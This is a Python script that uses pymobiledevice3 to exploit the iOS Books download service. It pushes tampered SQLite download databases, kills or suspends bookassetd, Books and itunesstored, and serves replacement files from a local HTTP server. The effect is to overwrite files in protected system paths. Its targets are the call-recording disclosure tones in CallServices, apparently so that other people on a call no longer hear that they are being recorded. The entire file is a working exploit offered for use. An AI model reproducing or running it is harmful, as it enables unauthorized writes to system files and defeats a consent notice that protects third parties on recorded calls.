import sys
import os
import shutil
import time
import socket
import sqlite3
import functools
import threading
import argparse
import subprocess
import asyncio
import queue
import posixpath
from threading import Timer
from http.server import HTTPServer, SimpleHTTPRequestHandler
from packaging.version import parse as parse_version
from pathlib import Path

try:
    from pymobiledevice3 import usbmux
    from pymobiledevice3.lockdown import create_using_usbmux, LockdownClient
    from pymobiledevice3.services.os_trace import OsTraceService
    from pymobiledevice3.services.afc import AfcService
    from pymobiledevice3.services.dvt.instruments.process_control import ProcessControl
    from pymobiledevice3.services.dvt.dvt_secure_socket_proxy import DvtSecureSocketProxyService
    from pymobiledevice3.remote.remote_service_discovery import RemoteServiceDiscoveryService
    from pymobiledevice3.exceptions import NoDeviceConnectedError, DeviceNotFoundError
except ImportError as e:
    print(f"[Error] Missing library: {e}", flush=True)
    print("Please run: pip install pymobiledevice3", flush=True)
    sys.exit(1)

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
LOCAL_SOUNDS_DIR = os.path.join(SCRIPT_DIR, "Sounds")
UUID_FILE = os.path.join(SCRIPT_DIR, "uuid.txt")

TARGET_DISCLOSURE_PATH = "" 
sd_file = "" 
RESPRING_ENABLED = False
GLOBAL_TIMEOUT_SECONDS = 500

audio_head_ok = threading.Event()
audio_get_ok = threading.Event()
info_queue = queue.Queue()

class AudioRequestHandler(SimpleHTTPRequestHandler):
    def log_request(self, code='-', size='-'): 
        try:
            code_int = int(code)
        except:
            code_int = 0
            
        target_file = os.path.basename(sd_file)
        if code_int == 200 and self.path == "/" + target_file:
            if self.command == "HEAD":
                audio_head_ok.set()
            elif self.command == "GET":
                audio_get_ok.set()

def get_lan_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try: s.connect(("8.8.8.8", 80)); return s.getsockname()[0]
    except: return "127.0.0.1"
    finally: s.close()

def start_http_server():
    try:
        handler = functools.partial(AudioRequestHandler)
        httpd = HTTPServer(("0.0.0.0", 0), handler)
        info_queue.put((get_lan_ip(), httpd.server_port))
        httpd.serve_forever()
    except Exception as e:
        print(f"[Server Error] {e}", flush=True)

def get_default_udid() -> str:
    try:
        devices = list(usbmux.list_devices())
    except Exception as e:
        raise RuntimeError(f"Error getting device list: {e}")

    if not devices:
        raise NoDeviceConnectedError("No device found. Please check the cable and tap 'Trust' on the iPhone.")

    usb_devices = []
    for d in devices:
        is_usb = getattr(d, "is_usb", None)
        if is_usb is None:
            is_usb = str(getattr(d, "connection_type", "")).upper() == "USB"
        if is_usb:
            usb_devices.append(d)

    if usb_devices:
        device = usb_devices[0]
    else:
        device = devices[0]

    udid = device.serial
    print(f"[*] Auto-detected device: {udid}", flush=True)
    return udid

def wait_for_uuid_logic(service_provider):
    print("[*] Searching for bookassetd container UUID...", flush=True)
    print(" -> Please open the Books app on your iPhone and download a book (or open any book).", flush=True)
    
    found_uuid = None
    start_time = time.time()
    
    try:
        for syslog_entry in OsTraceService(lockdown=service_provider).syslog():
            if time.time() - start_time > 120: 
                print("[!] UUID timeout (120s).", flush=True)
                break
            
            if posixpath.basename(syslog_entry.filename) == 'bookassetd':
                message = syslog_entry.message
                if "/var/containers/Shared/SystemGroup/" in message:
                    try:
                        uuid_part = message.split("/var/containers/Shared/SystemGroup/")[1].split("/")[0]
                        if len(uuid_part) >= 10 and not uuid_part.startswith("systemgroup.com.apple"):
                            found_uuid = uuid_part
                            break
                    except: continue
                if "/Documents/BLDownloads/" in message:
                    try:
                        uuid_part = message.split("/var/containers/Shared/SystemGroup/")[1].split("/Documents/BLDownloads")[0]
                        if len(uuid_part) >= 10:
                            found_uuid = uuid_part
                            break
                    except: continue
    except Exception as e:
        print(f"[Log Error] {e}", flush=True)
        
    return found_uuid

def main_callback(service_provider, dvt, uuid):
    global audio_head_ok, audio_get_ok
    audio_head_ok.clear()
    audio_get_ok.clear()

    t = threading.Thread(target=start_http_server, daemon=True)
    t.start()
    try:
        ip, port = info_queue.get(timeout=5)
    except:
        print("[Error] Cannot start internal server.", flush=True)
        return

    filename_only = os.path.basename(sd_file)
    audio_url = f"http://{ip}:{port}/{filename_only}"
    print(f"[*] Server running at: {audio_url}", flush=True)

    FILE_BL_TEMP = "working_BL.sqlite"
    FILE_DL_TEMP = "working_DL.sqlitedb"
    
    if not os.path.exists("BLDatabaseManager.sqlite"):
        print("[!] Creating template file BLDatabaseManager.sqlite...", flush=True)
        with sqlite3.connect("BLDatabaseManager.sqlite") as conn:
            conn.execute("CREATE TABLE IF NOT EXISTS ZBLDOWNLOADINFO (ZASSETPATH VARCHAR, ZPLISTPATH VARCHAR, ZDOWNLOADID VARCHAR, ZURL VARCHAR)")
            conn.execute("INSERT INTO ZBLDOWNLOADINFO VALUES ('','','','')")

    if not os.path.exists("downloads.28.sqlitedb"):
        print("[!] Creating template file downloads.28.sqlitedb...", flush=True)
        with sqlite3.connect("downloads.28.sqlitedb") as conn:
             conn.execute("CREATE TABLE IF NOT EXISTS asset (local_path VARCHAR, url VARCHAR)")
             conn.execute("INSERT INTO asset VALUES ('/private/var/containers/Shared/SystemGroup/UUID/Documents/BLDatabaseManager/BLDatabaseManager.sqlite', 'http://url')")

    shutil.copy("BLDatabaseManager.sqlite", FILE_BL_TEMP)
    shutil.copy("downloads.28.sqlitedb", FILE_DL_TEMP)

    with sqlite3.connect(FILE_BL_TEMP) as bldb_conn:
        c = bldb_conn.cursor()
        c.execute("UPDATE ZBLDOWNLOADINFO SET ZASSETPATH=?, ZPLISTPATH=?, ZDOWNLOADID=?", (TARGET_DISCLOSURE_PATH, TARGET_DISCLOSURE_PATH, TARGET_DISCLOSURE_PATH))
        c.execute("UPDATE ZBLDOWNLOADINFO SET ZURL=?", (audio_url,))
        bldb_conn.commit()

    with sqlite3.connect(FILE_DL_TEMP) as conn:
        c = conn.cursor()
        local_p = f"/private/var/containers/Shared/SystemGroup/{uuid}/Documents/BLDatabaseManager/BLDatabaseManager.sqlite"
        server_p = f"http://{ip}:{port}/{FILE_BL_TEMP}" 
        
        c.execute(f"UPDATE asset SET local_path = '{local_p}' WHERE local_path LIKE '%/BLDatabaseManager.sqlite'")
        c.execute(f"UPDATE asset SET local_path = '{local_p}-shm' WHERE local_path LIKE '%/BLDatabaseManager.sqlite-shm'")
        c.execute(f"UPDATE asset SET local_path = '{local_p}-wal' WHERE local_path LIKE '%/BLDatabaseManager.sqlite-wal'")
        
        c.execute(f"UPDATE asset SET url = '{server_p}' WHERE url LIKE '%/BLDatabaseManager.sqlite'")
        c.execute(f"UPDATE asset SET url = '{server_p}-shm' WHERE url LIKE '%/BLDatabaseManager.sqlite-shm'")
        c.execute(f"UPDATE asset SET url = '{server_p}-wal' WHERE url LIKE '%/BLDatabaseManager.sqlite-wal'")
        conn.commit()

    afc = AfcService(lockdown=service_provider)
    pc = ProcessControl(dvt)

    procs = OsTraceService(lockdown=service_provider).get_pid_list().get("Payload", {})
    pid_book = next((pid for pid, p in procs.items() if p['ProcessName'] == 'bookassetd'), None)
    pid_books = next((pid for pid, p in procs.items() if p['ProcessName'] == 'Books'), None)
    
    if pid_book: 
        try: pc.signal(pid_book, 19);
        except: pass
    if pid_books: 
        try: pc.kill(pid_books)
        except: pass

    print(f"[*] Uploading audio file: {filename_only}", flush=True)
    try:
        AfcService(lockdown=service_provider).push(sd_file, filename_only)
        afc.push(FILE_DL_TEMP, "Downloads/downloads.28.sqlitedb")
        afc.push(f"{FILE_DL_TEMP}-shm", "Downloads/downloads.28.sqlitedb-shm")
        afc.push(f"{FILE_DL_TEMP}-wal", "Downloads/downloads.28.sqlitedb-wal")
    except Exception as e:
        print(f"[Warning] Upload failed: {e}", flush=True)

    pid_itunes = next((pid for pid, p in procs.items() if p['ProcessName'] == 'itunesstored'), None)
    if pid_itunes: 
        try: pc.kill(pid_itunes)
        except: pass

    time.sleep(2)
    
    pid_book = next((pid for pid, p in procs.items() if p['ProcessName'] == 'bookassetd'), None)
    pid_books = next((pid for pid, p in procs.items() if p['ProcessName'] == 'Books'), None)
    if pid_book: 
        try: pc.kill(pid_book)
        except: pass
    if pid_books: 
        try: pc.kill(pid_books)
        except: pass

    try: pc.launch("com.apple.iBooks")
    except: pass

    print("[*] Waiting for iPhone to download file (Triggering exploit)...", flush=True)
    start = time.time()
    while True:
        if audio_get_ok.is_set():
            print("[OK] Success! File replaced.", flush=True)
            break
        if time.time() - start > 45:
            print("[!] Timeout. Check network connection (same Wifi).", flush=True)
            break
        time.sleep(0.1)

    try:
        if AfcService(lockdown=service_provider).exists(filename_only):
            AfcService(lockdown=service_provider).remove(filename_only)
    except: pass

    if RESPRING_ENABLED:
        print("[*] Respringing (SpringBoard Restart)...", flush=True)
        pid_sb = next((pid for pid, p in procs.items() if p['ProcessName'] == 'SpringBoard'), None)
        if pid_sb: 
            try: pc.kill(pid_sb)
            except: pass
    
    for f in [FILE_BL_TEMP, FILE_DL_TEMP, f"{FILE_DL_TEMP}-shm", f"{FILE_DL_TEMP}-wal"]:
        if os.path.exists(f): os.remove(f)

async def create_tunnel(udid):
    python_exec = sys.executable
    cmd = [python_exec, "-m", "pymobiledevice3", "lockdown", "start-tunnel", "--script-mode", "--udid", udid]
    
    if os.geteuid() != 0:
        cmd.insert(0, "sudo")

    print("[*] Creating Tunnel (iOS 17+)...", flush=True)
    p = subprocess.Popen(cmd, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    while True:
        line = p.stdout.readline()
        if line: 
            decoded = line.decode().strip()
            return {"address": decoded.split(" ")[0], "port": int(decoded.split(" ")[1])}
        if p.poll() is not None:
            break
    return None

async def connection_context(udid):
    sp = create_using_usbmux(serial=udid)
    ver = parse_version(sp.product_version)
    
    uuid = ""
    if os.path.exists(UUID_FILE):
        content = open(UUID_FILE).read().strip()
        if len(content) > 10: uuid = content

    if not uuid:
        uuid = wait_for_uuid_logic(sp)
        if uuid:
            with open(UUID_FILE, "w") as f: f.write(uuid)
            print(f"[*] UUID saved: {uuid}", flush=True)
        else:
            print("[Error] UUID not found. Try reopening the Books app.", flush=True)
            return

    if ver >= parse_version('17.0'):
        addr = await create_tunnel(udid)
        if addr:
            async with RemoteServiceDiscoveryService((addr["address"], addr["port"])) as rsd:
                with DvtSecureSocketProxyService(rsd) as dvt: 
                    main_callback(rsd, dvt, uuid)
        else:
            print("[Error] Failed to create Tunnel.", flush=True)
    else:
        with DvtSecureSocketProxyService(lockdown=sp) as dvt: 
            main_callback(sp, dvt, uuid)

if __name__ == "__main__":
    os.chdir(SCRIPT_DIR)
    
    try:
        udid = get_default_udid()
    except Exception as e:
        print(f"[Error] {e}", flush=True)
        sys.exit(1)

    if not os.path.exists(LOCAL_SOUNDS_DIR):
        print(f"[Error] Sounds folder not found at: {LOCAL_SOUNDS_DIR}", flush=True)
        sys.exit(1)

    tasks = [
        {
            "filename": "StartDisclosureWithTone.m4a",
            "target": "/var/mobile/Library/CallServices/Greetings/default/StartDisclosureWithTone.m4a",
            "respring": False
        },
        {
            "filename": "StopDisclosure.caf",
            "target": "/var/mobile/Library/CallServices/Greetings/default/StopDisclosure.caf",
            "respring": True
        }
    ]

    for task in tasks:
        fname = task["filename"]
        source_path = os.path.join(LOCAL_SOUNDS_DIR, fname)
        
        if not os.path.exists(source_path):
            print(f"[Skip] Source file not found: {source_path}", flush=True)
            continue
        
        temp_path = os.path.join(SCRIPT_DIR, fname)
        try:
            shutil.copy(source_path, temp_path)
            
            print(f"\n=== Processing: {fname} ===", flush=True)
            
            sd_file = temp_path
            TARGET_DISCLOSURE_PATH = task["target"]
            RESPRING_ENABLED = task["respring"]
            
            try:
                asyncio.run(connection_context(udid))
            except Exception as e:
                print(f"[Error] Exception: {e}", flush=True)
                import traceback
                traceback.print_exc()
        finally:
            if os.path.exists(temp_path):
                os.remove(temp_path)

    print("\n[Done] YangJiii - @duongduong0908", flush=True)